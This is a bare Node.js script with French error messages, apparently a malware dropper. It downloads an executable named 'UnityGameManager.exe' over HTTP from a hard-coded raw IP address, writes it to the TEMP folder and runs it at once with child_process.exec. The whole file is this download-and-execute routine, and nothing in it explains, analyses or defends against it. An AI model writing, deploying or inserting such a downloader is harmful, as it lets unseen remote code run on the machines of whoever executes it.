const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');
const path = require('path');

const fileUrl = 'http://83.222.190.222/UnityGameManager.exe';
const filePath = path.join(process.env.TEMP, 'UnityGameManager.exe');

const downloadFile = (url, dest) => {
  const file = fs.createWriteStream(dest);
  http.get(url, (response) => {
    response.pipe(file);
    file.on('finish', () => {
      file.close(executeFile); 
    });
  }).on('error', (err) => {
    fs.unlink(dest); 
    console.error('Erreur lors du téléchargement:', err.message);
  });
};

const executeFile = () => {
  exec(`${filePath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Erreur d'exécution: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`Erreur: ${stderr}`);
      return;
    }
    console.log(`Sortie: ${stdout}`);
  });
};

downloadFile(fileUrl, filePath);
